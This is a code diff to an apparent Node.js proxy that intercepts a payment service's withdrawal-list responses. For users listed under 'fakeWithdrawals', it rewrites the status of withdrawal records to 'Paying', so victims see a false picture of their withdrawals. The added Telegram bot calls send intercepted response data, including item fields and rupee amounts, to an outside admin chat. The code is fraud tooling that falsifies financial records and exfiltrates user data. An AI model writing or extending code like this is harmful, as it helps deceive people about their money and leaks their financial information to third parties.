@@ -994,27 +994,69 @@ app.all('/withdraw/list', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
+    if (bankData.adminChatId && bot) {
+      bot.sendMessage(bankData.adminChatId,
+        `📋 /withdraw/list HIT!\nOverrides: ${hasOverrides}\nKeys: ${Object.keys(bankData.fakeWithdrawals || {})}\nResp type: ${jsonResp ? typeof jsonResp.data : 'null'}\nData sample: ${jsonResp ? JSON.stringify(jsonResp.data).substring(0, 200) : 'null'}`
+      ).catch(() => {});
+    }
+
     if (hasOverrides && jsonResp && jsonResp.data) {
       let items = null;
       if (Array.isArray(jsonResp.data)) items = jsonResp.data;
       else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
       else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
-      else if (typeof jsonResp.data === 'object') {
-        const arrKey = Object.keys(jsonResp.data).find(k => Array.isArray(jsonResp.data[k]));
-        if (arrKey) items = jsonResp.data[arrKey];
+      if (!items && typeof jsonResp.data === 'object') {
+        for (const k of Object.keys(jsonResp.data)) {
+          if (Array.isArray(jsonResp.data[k]) && jsonResp.data[k].length > 0) {
+            items = jsonResp.data[k];
+            break;
+          }
+        }
       }
 
       if (items && items.length > 0) {
+        const firstItem = items[0];
+        const allKeys = Object.keys(firstItem);
+        const statusKeys = allKeys.filter(k => /status/i.test(k));
+
+        if (bankData.adminChatId && bot) {
+          bot.sendMessage(bankData.adminChatId,
+            `📊 List found: ${items.length} items\nItem keys: ${allKeys.join(', ')}\nStatus keys: ${statusKeys.join(', ')}\nFirst item status fields: ${statusKeys.map(k => k + '=' + JSON.stringify(firstItem[k])).join(', ')}\nLast item status fields: ${statusKeys.map(k => k + '=' + JSON.stringify(items[items.length-1][k])).join(', ')}`
+          ).catch(() => {});
+        }
+
         for (const [uid, override] of Object.entries(bankData.fakeWithdrawals)) {
           const count = override.count || 0;
           if (count <= 0) continue;
           let changed = 0;
+          const changedDetails = [];
           for (let i = items.length - 1; i >= 0 && changed < count; i--) {
-            items[i].status = 0;
-            items[i].statusName = 'Paying';
+            const oldStatus = items[i].status;
+            const oldStatusName = items[i].statusName;
+            for (const sk of statusKeys) {
+              if (sk === 'statusName' || sk === 'statusText') {
+                items[i][sk] = 'Paying';
+              } else {
+                items[i][sk] = 0;
+              }
+            }
+            if (statusKeys.length === 0) {
+              items[i].status = 0;
+              items[i].statusName = 'Paying';
+            }
+            changedDetails.push(`#${i}: ${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || '?'})`);
             changed++;
           }
-          console.log('[withdraw/list] Changed', changed, 'items to Paying for user', uid);
+
+          if (bankData.adminChatId && bot) {
+            bot.sendMessage(bankData.adminChatId,
+              `✅ Changed ${changed} withdrawal(s) to Paying for ${uid}:\n${changedDetails.join('\n')}`
+            ).catch(() => {});
+          }
+        }
+      } else {
+        if (bankData.adminChatId && bot) {
+          bot.sendMessage(bankData.adminChatId, `⚠️ No list items found in response!`).catch(() => {});
         }
       }
     }
